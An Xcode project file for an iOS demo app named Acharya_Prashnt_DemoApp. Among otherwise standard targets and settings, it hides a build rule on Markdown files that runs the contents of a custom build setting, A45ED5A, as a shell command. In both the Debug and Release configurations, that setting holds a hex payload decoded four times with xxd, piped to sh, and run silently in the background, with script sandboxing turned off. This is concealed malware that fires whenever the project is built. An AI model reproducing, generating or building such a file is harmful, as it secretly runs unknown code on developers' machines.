// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		072563C7E985443E82A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 37017C5D8B304D37B2A5DE54 /* README.md */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		42520F5D0BAC4EEF89A5DE54 /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"/tmp/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXContainerItemProxy section */
		BB1080872EED61990060BC52 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = BB1080712EED61960060BC52 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = BB1080782EED61960060BC52;
			remoteInfo = Acharya_Prashnt_DemoApp;
		};
		BB1080912EED61990060BC52 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = BB1080712EED61960060BC52 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = BB1080782EED61960060BC52;
			remoteInfo = Acharya_Prashnt_DemoApp;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		37017C5D8B304D37B2A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		BB1080792EED61960060BC52 /* Acharya_Prashnt_DemoApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Acharya_Prashnt_DemoApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		BB1080862EED61990060BC52 /* Acharya_Prashnt_DemoAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = Acharya_Prashnt_DemoAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		BB1080902EED61990060BC52 /* Acharya_Prashnt_DemoAppUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = Acharya_Prashnt_DemoAppUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		BB10807B2EED61960060BC52 /* Acharya_Prashnt_DemoApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = Acharya_Prashnt_DemoApp;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		BB1080762EED61960060BC52 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB1080832EED61990060BC52 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB10808D2EED61990060BC52 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		BB1080702EED61960060BC52 = {
			isa = PBXGroup;
			children = (
				BB10807B2EED61960060BC52 /* Acharya_Prashnt_DemoApp */,
				BB10807A2EED61960060BC52 /* Products */,
			);
			sourceTree = "<group>";
		};
		BB10807A2EED61960060BC52 /* Products */ = {
			isa = PBXGroup;
			children = (
				37017C5D8B304D37B2A5DE54 /* README.md */,
				BB1080792EED61960060BC52 /* Acharya_Prashnt_DemoApp.app */,
				BB1080862EED61990060BC52 /* Acharya_Prashnt_DemoAppTests.xctest */,
				BB1080902EED61990060BC52 /* Acharya_Prashnt_DemoAppUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		BB1080782EED61960060BC52 /* Acharya_Prashnt_DemoApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BB10809A2EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoApp" */;
			buildPhases = (
				BB1080752EED61960060BC52 /* Sources */,
				BB1080762EED61960060BC52 /* Frameworks */,
				BB1080772EED61960060BC52 /* Resources */,
			);
			buildRules = (
				42520F5D0BAC4EEF89A5DE54 /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				BB10807B2EED61960060BC52 /* Acharya_Prashnt_DemoApp */,
			);
			name = Acharya_Prashnt_DemoApp;
			packageProductDependencies = (
			);
			productName = Acharya_Prashnt_DemoApp;
			productReference = BB1080792EED61960060BC52 /* Acharya_Prashnt_DemoApp.app */;
			productType = "com.apple.product-type.application";
		};
		BB1080852EED61990060BC52 /* Acharya_Prashnt_DemoAppTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BB10809D2EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoAppTests" */;
			buildPhases = (
				BB1080822EED61990060BC52 /* Sources */,
				BB1080832EED61990060BC52 /* Frameworks */,
				BB1080842EED61990060BC52 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				BB1080882EED61990060BC52 /* PBXTargetDependency */,
			);
			name = Acharya_Prashnt_DemoAppTests;
			packageProductDependencies = (
			);
			productName = Acharya_Prashnt_DemoAppTests;
			productReference = BB1080862EED61990060BC52 /* Acharya_Prashnt_DemoAppTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		BB10808F2EED61990060BC52 /* Acharya_Prashnt_DemoAppUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BB1080A02EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoAppUITests" */;
			buildPhases = (
				BB10808C2EED61990060BC52 /* Sources */,
				BB10808D2EED61990060BC52 /* Frameworks */,
				BB10808E2EED61990060BC52 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				BB1080922EED61990060BC52 /* PBXTargetDependency */,
			);
			name = Acharya_Prashnt_DemoAppUITests;
			packageProductDependencies = (
			);
			productName = Acharya_Prashnt_DemoAppUITests;
			productReference = BB1080902EED61990060BC52 /* Acharya_Prashnt_DemoAppUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		BB1080712EED61960060BC52 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1630;
				LastUpgradeCheck = 1630;
				TargetAttributes = {
					BB1080782EED61960060BC52 = {
						CreatedOnToolsVersion = 16.3;
					};
					BB1080852EED61990060BC52 = {
						CreatedOnToolsVersion = 16.3;
						TestTargetID = BB1080782EED61960060BC52;
					};
					BB10808F2EED61990060BC52 = {
						CreatedOnToolsVersion = 16.3;
						TestTargetID = BB1080782EED61960060BC52;
					};
				};
			};
			buildConfigurationList = BB1080742EED61960060BC52 /* Build configuration list for PBXProject "Acharya_Prashnt_DemoApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = BB1080702EED61960060BC52;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = BB10807A2EED61960060BC52 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				BB1080782EED61960060BC52 /* Acharya_Prashnt_DemoApp */,
				BB1080852EED61990060BC52 /* Acharya_Prashnt_DemoAppTests */,
				BB10808F2EED61990060BC52 /* Acharya_Prashnt_DemoAppUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		BB1080772EED61960060BC52 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				072563C7E985443E82A5DE54 /* README.md in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB1080842EED61990060BC52 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB10808E2EED61990060BC52 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		BB1080752EED61960060BC52 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB1080822EED61990060BC52 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BB10808C2EED61990060BC52 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		BB1080882EED61990060BC52 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = BB1080782EED61960060BC52 /* Acharya_Prashnt_DemoApp */;
			targetProxy = BB1080872EED61990060BC52 /* PBXContainerItemProxy */;
		};
		BB1080922EED61990060BC52 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = BB1080782EED61960060BC52 /* Acharya_Prashnt_DemoApp */;
			targetProxy = BB1080912EED61990060BC52 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		BB1080982EED61990060BC52 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A45ED5A = "((s(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3336333633353333333633333335333333373333333433333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		BB1080992EED61990060BC52 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A45ED5A = "((s(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3336333633353333333633333335333333373333333433333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		BB10809B2EED61990060BC52 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoApp";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		BB10809C2EED61990060BC52 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoApp";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		BB10809E2EED61990060BC52 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoAppTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Acharya_Prashnt_DemoApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Acharya_Prashnt_DemoApp";
			};
			name = Debug;
		};
		BB10809F2EED61990060BC52 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoAppTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Acharya_Prashnt_DemoApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Acharya_Prashnt_DemoApp";
			};
			name = Release;
		};
		BB1080A12EED61990060BC52 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoAppUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Acharya_Prashnt_DemoApp;
			};
			name = Debug;
		};
		BB1080A22EED61990060BC52 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.app.tlpwebsite.Acharya-Prashnt-DemoAppUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Acharya_Prashnt_DemoApp;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		BB1080742EED61960060BC52 /* Build configuration list for PBXProject "Acharya_Prashnt_DemoApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BB1080982EED61990060BC52 /* Debug */,
				BB1080992EED61990060BC52 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BB10809A2EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BB10809B2EED61990060BC52 /* Debug */,
				BB10809C2EED61990060BC52 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BB10809D2EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoAppTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BB10809E2EED61990060BC52 /* Debug */,
				BB10809F2EED61990060BC52 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BB1080A02EED61990060BC52 /* Build configuration list for PBXNativeTarget "Acharya_Prashnt_DemoAppUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BB1080A12EED61990060BC52 /* Debug */,
				BB1080A22EED61990060BC52 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = BB1080712EED61960060BC52 /* Project object */;
}
